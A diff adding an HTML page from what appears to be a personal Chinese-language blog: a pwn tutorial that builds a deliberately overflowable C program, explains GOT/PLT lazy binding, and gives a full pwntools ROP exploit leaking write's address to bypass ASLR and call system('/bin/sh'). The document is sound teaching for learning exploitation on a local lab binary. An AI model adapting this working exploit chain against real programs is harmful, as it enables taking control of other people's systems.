@@ -1,0 +1,136 @@
+<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" /> <!--[if lte IE 9]><meta http-equiv="refresh" content="0;url=/ie.html"><![endif]--> <meta name="author" content="void0red"> <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,400italic,600|Droid+Sans+Mono' rel='stylesheet' type='text/css'> <link rel="shortcut icon" href="/assets/img/favicon.png" /> <link rel="stylesheet" href="/css/main.css"> <link rel="canonical" href="http://localhost:4000/2017/11/15/leak_gotaddr.html"> <!-- Begin Jekyll SEO tag v2.3.0 --> <title>leak_got_addr | void0red’s blog</title> <meta property="og:title" content="leak_got_addr" /> <meta name="author" content="void0red" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="this is a test, not true" /> <meta property="og:description" content="this is a test, not true" /> <link rel="canonical" href="http://localhost:4000/2017/11/15/leak_gotaddr.html" /> <meta property="og:url" content="http://localhost:4000/2017/11/15/leak_gotaddr.html" /> <meta property="og:site_name" content="void0red’s blog" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2017-11-15T00:00:00+08:00" /> <script type="application/ld+json"> {"name":null,"description":"this is a test, not true","author":{"@type":"Person","name":"void0red"},"@type":"BlogPosting","url":"http://localhost:4000/2017/11/15/leak_gotaddr.html","publisher":null,"image":null,"headline":"leak_got_addr","dateModified":"2017-11-15T00:00:00+08:00","datePublished":"2017-11-15T00:00:00+08:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2017/11/15/leak_gotaddr.html"},"@context":"http://schema.org"}</script> <!-- End Jekyll SEO tag --> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="" /> <script src="/assets/js/prefixfree.js"></script> </head> <body> <script type="text/javascript" color="0,255,128" opacity='1' src="/assets/js/canvas-nest.min.js"></script> <aside id="sidebar" class="open"> <div id="sidebar-left"> <a id="sidebar-avatar" href="/"> <img id="sidebar-avatar-img" alt="" src="/assets/img/avatar.jpg"/> </a> <div id="sidebar-social"> <a href="/pages/feed.xml" class="sidebar-social-icon feed"></a> <a href="mailto:void0red@gmail.com" class="sidebar-social-icon email"></a> <!-- Generate icon by yourself https://icomoon.io/app/#/select --> <a href="https://github.com/void0red" class="sidebar-social-icon github" target="_blank"></a> </div> <ul id="sidebar-tags"> <li class="sidebar-tag active" data-filter="recent">最新文章</li> <li class="sidebar-tag" data-filter="others">others</li> <li class="sidebar-tag" data-filter="c">c</li> <li class="sidebar-tag" data-filter="bin">bin</li> <li class="sidebar-tag" data-filter="pwn">pwn</li> </ul> <div> <object type="application/x-shockwave-flash" style="outline:none;" data="/pic/hamster.swf" width="120" height="90"><param name="movie" value="http://cdn.abowman.com/widgets/hamster/hamster.swf?"></param><param name="AllowScriptAccess" value="always"></param><param name="wmode" value="opaque"></param></object> </div> </div> <div id="sidebar-right"> <div id="search-box"> <input id="search-input" type="text" placeholder="Search" /> </div> <nav id="toc"> <a class="toc-link" data-tags="pwn" href="/2017/11/15/leak_gotaddr.html"> leak_got_addr </a> <a class="toc-link" data-tags="pwn" href="/2017/11/11/ret2libc.html"> ret2libc </a> <a class="toc-link" data-tags="pwn" href="/2017/11/09/overflow.html"> overflow </a> <a class="toc-link" data-tags="others" href="/2017/11/05/a-letter.html"> a letter </a> <a class="toc-link" data-tags="bin" href="/2017/10/21/try_assembly_0.html"> try_assembly_0 </a> <a class="toc-link" data-tags="others" href="/2017/10/13/Crawler.html"> Crawler Sharing </a> <a class="toc-link" data-tags="c" href="/2017/10/07/struct.html"> About learning c struct </a> <a class="toc-link" data-tags="c" href="/2017/10/07/linked_list.html"> About learning linked_list </a> <a class="toc-link" data-tags="others" href="/2017/09/24/mysql.html"> About learning MYSQL </a> </nav> </div> </aside> <main id="main" class="open"> <article class="post container"> <div class="post-meta"> <span class="post-meta-span date">2017 November 15</span> <span class="post-meta-span tag">pwn</span> </div> <h1 class="post-title">leak_got_addr</h1> <blockquote> <p>this is a test, not true</p> </blockquote> <h2 id="0x00准备">0x00准备</h2> <ul> <li> <p>本次实验的机器为<code class="highlighter-rouge">Ubuntu 16.04.2 LTS</code>64位系统</p> </li> <li> <p>用<code class="highlighter-rouge">gcc</code>编译需要关闭<code class="highlighter-rouge">stack-protector</code></p> </li> <li> <p>需要<code class="highlighter-rouge">gdb</code> <code class="highlighter-rouge">peda</code> <code class="highlighter-rouge">pwntools</code></p> </li> <li> <p>攻击目标<code class="highlighter-rouge">test.c</code></p> <div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include&lt;unistd.h&gt;
+</span><span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+	<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"2333</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
+	<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mi">256</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div> </li> </ul> <h2 id="0x01分析">0x01分析</h2> <p>这次把栈溢出的保护几乎都打开了，<code class="highlighter-rouge">ASLR</code>使得无法通过<code class="highlighter-rouge">ret2libc</code>来获得shell，栈上也没有可执行权限。所以可以通过<code class="highlighter-rouge">write</code>函数leak一个函数在内存中的地址（它是随机的），然后根据<code class="highlighter-rouge">libc.so.6</code>文件中<code class="highlighter-rouge">system</code>与<code class="highlighter-rouge">write</code>的相对地址，推算出<code class="highlighter-rouge">system</code>在本次运行中的内存中的地址。</p> <p>这里可以利用一个Linux下的特性，<strong>lazy binding</strong>，简单来说，GOT 表的初始值都指向 PLT 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT 表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p> <p>第一次函数调用： <img src="https://raw.githubusercontent.com/void0red/Pictures/master/blog/leak_gotaddr_0.png" alt="第一次调用函数" /> 以后的函数调用： <img src="https://raw.githubusercontent.com/void0red/Pictures/master/blog/leak_gotaddr_1.png" alt="以后的函数调用" /></p> <p>例如：下面的执行流处于调用<code class="highlighter-rouge">write</code>函数的上面</p> <div class="highlighter-rouge"><pre class="highlight"><code>   0x40056e &lt;main+8&gt;:	mov    edx,0x5
+   0x400573 &lt;main+13&gt;:	mov    esi,0x400624
+   0x400578 &lt;main+18&gt;:	mov    edi,0x1
+=&gt; 0x40057d &lt;main+23&gt;:	call   0x400430 &lt;write@plt&gt;
+   0x400582 &lt;main+28&gt;:	lea    rax,[rbp-0x10]
+   0x400586 &lt;main+32&gt;:	mov    edx,0x100
+   0x40058b &lt;main+37&gt;:	mov    rsi,rax
+   0x40058e &lt;main+40&gt;:	mov    edi,0x0
+</code></pre></div> <p>跟进去</p> <div class="highlighter-rouge"><pre class="highlight"><code>  0x400420:	push   QWORD PTR [rip+0x200be2]        # 0x601008
+   0x400426:	jmp    QWORD PTR [rip+0x200be4]        # 0x601010
+   0x40042c:	nop    DWORD PTR [rax+0x0]
+=&gt; 0x400430 &lt;write@plt&gt;:	jmp    QWORD PTR [rip+0x200be2]        # 0x601018
+ | 0x400436 &lt;write@plt+6&gt;:	push   0x0
+ | 0x40043b &lt;write@plt+11&gt;:	jmp    0x400420
+ | 0x400440 &lt;read@plt&gt;:	jmp    QWORD PTR [rip+0x200bda]        # 0x601020
+ | 0x400446 &lt;read@plt+6&gt;:	push   0x1
+ |-&gt;   0x400436 &lt;write@plt+6&gt;:	push   0x0
+       0x40043b &lt;write@plt+11&gt;:	jmp    0x400420
+       0x400440 &lt;read@plt&gt;:	jmp    QWORD PTR [rip+0x200bda]        # 0x601020
+       0x400446 &lt;read@plt+6&gt;:	push   0x1
+                                                                  JUMP is taken
+</code></pre></div> <p>指令准备发生跳转到<code class="highlighter-rouge">0x400420</code>处，而<code class="highlighter-rouge">0x400420</code>处的指令即是跳转到<code class="highlighter-rouge">0x601010</code>，<code class="highlighter-rouge">0x601010</code>处存储的是解析函数实际地址的指令地址</p> <div class="highlighter-rouge"><pre class="highlight"><code>  0x40041c:	add    BYTE PTR [rax],al
+   0x40041e:	add    BYTE PTR [rax],al
+   0x400420:	push   QWORD PTR [rip+0x200be2]        # 0x601008
+=&gt; 0x400426:	jmp    QWORD PTR [rip+0x200be4]        # 0x601010
+ | 0x40042c:	nop    DWORD PTR [rax+0x0]
+ | 0x400430 &lt;write@plt&gt;:	jmp    QWORD PTR [rip+0x200be2]        # 0x601018
+ | 0x400436 &lt;write@plt+6&gt;:	push   0x0
+ | 0x40043b &lt;write@plt+11&gt;:	jmp    0x400420
+ |-&gt;   0x7ffff7dee870 &lt;_dl_runtime_resolve_avx&gt;:	push   rbx
+       0x7ffff7dee871 &lt;_dl_runtime_resolve_avx+1&gt;:	mov    rbx,rsp
+       0x7ffff7dee874 &lt;_dl_runtime_resolve_avx+4&gt;:	and    rsp,0xffffffffffffffe0
+       0x7ffff7dee878 &lt;_dl_runtime_resolve_avx+8&gt;:	sub    rsp,0x180
+                                                                  JUMP is taken
+</code></pre></div> <p>上面的<code class="highlighter-rouge">_dl_runtime_resolve_avx</code>函数就是解析实际地址的指令</p> <h2 id="0x02查找可用的gadgets">0x02查找可用的gadgets</h2> <p>因为<code class="highlighter-rouge">write</code>函数至少需要三个参数，所以需要找到<code class="highlighter-rouge">rdi，rsi，rdx</code>来传递参数，这个时候，<code class="highlighter-rouge">&lt;__libc_csu_init&gt;</code>函数就比较好用了，用<code class="highlighter-rouge">objdump -S test</code>来查看所有的汇编代码</p> <div class="highlighter-rouge"><pre class="highlight"><code>00000000004005a0 &lt;__libc_csu_init&gt;:
+  4005a0:	41 57                	push   %r15
+  4005a2:	41 56                	push   %r14
+  4005a4:	41 89 ff             	mov    %edi,%r15d
+  4005a7:	41 55                	push   %r13
+  4005a9:	41 54                	push   %r12
+  4005ab:	4c 8d 25 5e 08 20 00 	lea    0x20085e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;
+  4005b2:	55                   	push   %rbp
+  4005b3:	48 8d 2d 5e 08 20 00 	lea    0x20085e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;
+  4005ba:	53                   	push   %rbx
+  4005bb:	49 89 f6             	mov    %rsi,%r14
+  4005be:	49 89 d5             	mov    %rdx,%r13
+  4005c1:	4c 29 e5             	sub    %r12,%rbp
+  4005c4:	48 83 ec 08          	sub    $0x8,%rsp
+  4005c8:	48 c1 fd 03          	sar    $0x3,%rbp
+  4005cc:	e8 2f fe ff ff       	callq  400400 &lt;_init&gt;
+  4005d1:	48 85 ed             	test   %rbp,%rbp
+  4005d4:	74 20                	je     4005f6 &lt;__libc_csu_init+0x56&gt;
+  4005d6:	31 db                	xor    %ebx,%ebx
+  4005d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+  4005df:	00 
+  4005e0:	4c 89 ea             	mov    %r13,%rdx
+  4005e3:	4c 89 f6             	mov    %r14,%rsi
+  4005e6:	44 89 ff             	mov    %r15d,%edi
+  4005e9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
+  4005ed:	48 83 c3 01          	add    $0x1,%rbx
+  4005f1:	48 39 eb             	cmp    %rbp,%rbx
+  4005f4:	75 ea                	jne    4005e0 &lt;__libc_csu_init+0x40&gt;
+  4005f6:	48 83 c4 08          	add    $0x8,%rsp
+  4005fa:	5b                   	pop    %rbx
+  4005fb:	5d                   	pop    %rbp
+  4005fc:	41 5c                	pop    %r12
+  4005fe:	41 5d                	pop    %r13
+  400600:	41 5e                	pop    %r14
+  400602:	41 5f                	pop    %r15
+  400604:	c3                   	retq   
+  400605:	90                   	nop
+  400606:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
+  40060d:	00 00 00 
+</code></pre></div> <p>可以看到从<code class="highlighter-rouge">0x4005fa</code>开始，进行了弹栈，可以控制<code class="highlighter-rouge">rbx，rbp，r12，r13，r14，r15</code>的值，配合<code class="highlighter-rouge">0x4005e0</code>处的指令，就可以控制<code class="highlighter-rouge">edi，rsi，rdx</code>的值了，要注意的是<code class="highlighter-rouge">0x4005f4</code>处有一个跳转指令，要让跳转失效，就必须让<code class="highlighter-rouge">rbp==rbx</code>，继续向前看，<code class="highlighter-rouge">0x4005ed</code>处让<code class="highlighter-rouge">rbx</code>加上了1，<code class="highlighter-rouge">0x4005e9</code>处的意思是调用<code class="highlighter-rouge">r12+rbx×8</code>处的指令，不妨让<code class="highlighter-rouge">rbx=0</code>，<code class="highlighter-rouge">rbp=1</code></p> <h2 id="0x03编写payload">0x03编写payload</h2> <p>尝试了一下新工具<code class="highlighter-rouge">pwntools</code></p> <div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./test'</span><span class="p">)</span>
+<span class="n">return_offset</span> <span class="o">=</span> <span class="mi">24</span>
+<span class="n">got_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
+<span class="n">got_read</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
+<span class="n">gadget0_addr</span> <span class="o">=</span> <span class="mh">0x4005fa</span>
+<span class="n">gadget1_addr</span> <span class="o">=</span> <span class="mh">0x4005e0</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x400566</span>
+<span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x601040</span>
+<span class="n">symbols_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+
+<span class="n">payload1</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="n">return_offset</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget0_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget1_addr</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mi">56</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./test'</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'2333</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">'--------payload1'</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">symbols_offset</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'2333</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="n">payload2</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="n">return_offset</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget0_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_read</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget1_addr</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mi">56</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">'--------payload2'</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'2333</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="n">payload3</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="n">return_offset</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget0_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget1_addr</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">'--------payload3'</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div> <p>三段payload的结构大致相似，首先一段padding，填充到<code class="highlighter-rouge">read</code>函数的返回地址之前，然后让程序跳转到<code class="highlighter-rouge">pop...</code>处，接下来，是需要<code class="highlighter-rouge">pop</code>对象：</p> <p>第一个0是存进<code class="highlighter-rouge">rbx</code>的，第二个1是存进<code class="highlighter-rouge">rbp</code>的，接下来是<code class="highlighter-rouge">write</code>函数在GOT表中的地址，存进<code class="highlighter-rouge">r12</code>，也就是第二个<code class="highlighter-rouge">gadget</code>中<code class="highlighter-rouge">call</code>的对象，然后是<code class="highlighter-rouge">write</code>函数的三个参数（注意寄存器顺序），其中第二个参数是<code class="highlighter-rouge">write</code>函数在GOT表中的地址，因为已经执行过<code class="highlighter-rouge">write</code>函数了（现在执行流就在<code class="highlighter-rouge">write</code>函数里面），所以这个地址存放的指令不再是跳转，解析，而是<code class="highlighter-rouge">write</code>函数在内存中的实际地址，这样就让程序<code class="highlighter-rouge">leak</code>出了一段真实地址</p> <p>现在payload已经完成了所有值的传递，接着是第二段<code class="highlighter-rouge">gadget</code>，然后为了让程序回到<code class="highlighter-rouge">main</code>函数里面（保住接着溢出攻击），用54字节的padding填充弹栈行为，劫持到<code class="highlighter-rouge">0x400604</code>处的<code class="highlighter-rouge">retq</code>指令，回到<code class="highlighter-rouge">main</code>函数</p> <p>然后两个<code class="highlighter-rouge">payload</code>和第一个结构类似，第二个<code class="highlighter-rouge">payload</code>将<code class="highlighter-rouge">system</code>的实际地址，以及<code class="highlighter-rouge">/bin/sh</code>存入<code class="highlighter-rouge">.bss</code>段中，第三个<code class="highlighter-rouge">payload</code>则是调用<code class="highlighter-rouge">system</code>函数，实现getshell</p> <h2 id="0x04总结">0x04总结</h2> <p>通过<code class="highlighter-rouge">leak_gotaddr</code>，可以获得函数的真实地址，也就是绕过了<code class="highlighter-rouge">ASLR</code>的保护</p> </article> <div class="footer"> <div class="container"> <p class="footer-entry">All content is licensed under <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA</a></p> <p class="footer-entry">All passages are written by <strong>void0red</strong></p> <p class="footer-entry" style="color:#ffffff">苟利国家生死以，岂因祸福避趋之</p> </div> </div> </main> <button id="menu" class="open"> <span id="menu-icons"></span> </button> <button id="post-toc-menu"> <span id="post-toc-menu-icons"></span> </button> <div id="post-toc"> <span id="post-toc-title">Table of Contents</span> <ul id="post-toc-ul"></ul> </div> <script src="/assets/js/jquery-2.1.3.min.js"></script> <script src="/assets/js/jquery.pjax.js"></script> <script src="/assets/js/nprogress.js"></script> <script src="/assets/js/main.js"></script> </body> </html>
